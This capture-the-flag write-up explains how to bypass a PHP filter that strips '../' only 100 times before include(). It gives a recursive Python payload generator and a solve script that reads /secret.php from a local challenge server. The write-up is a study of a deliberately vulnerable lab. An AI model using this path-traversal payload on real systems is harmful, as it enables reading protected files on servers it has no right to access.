# Overview
- In this challenge we need to perform an LFI attack (Local File Inclusion) to load the file `/secret.php` which contains the flag.
- We analyze the following code:
```php
$list = isset($_GET['list']) ? $_GET['list'] : null;
$content = '';
function clean($input) {
    $max_depth = 100; # Should be enough right?
    for ($i = 0; $i < $max_depth; $i++) {
        $clean = str_replace(['../'], '', $input);
        if ($clean === $input) { # No changes
            return $clean;
        }
        $input = $clean;
    }
    return $clean;
}

if ($list) {
    $clean_list = clean($list);
    $filePath = __DIR__ . '/lists/' . $clean_list;
    if (file_exists($filePath)) {
        ob_start();
        include($filePath);
        $content .= ob_get_clean();
    } else {
        $content .= "<p>List not found.</p>";
    }
}
```
- When `list` param is set, the `clean` function is called to remove any `../` from the input and then the file is included.
- If a check was not made, we could simply use `list=../../../../secret.php` to load the file. However, the `clean` function removes the `../` from the input. But it only does it 100 times.


# Solution

- Let's say the clean was performed only once, we would look for a payload that when `../` was removed, would result to `../`. We can use `....//` for this.
- Scaling this up for `N+1` times, we can use:
```python
def payload(N=101):
    if N == 0:
        return ''
    return f'..{payload(N-1)}/'
```
- We need this payload 4 times to reach the root directory and then we can load the `secret.php` file.
- Final solve script:
```python
from requests import get
url = 'http://localhost:1337'

def payload(N=101):
    if N == 0:
        return ''
    return f'..{payload(N-1)}/'

r=get(f'{url}/?list={payload()*5}secret.php').text
print(r)
```
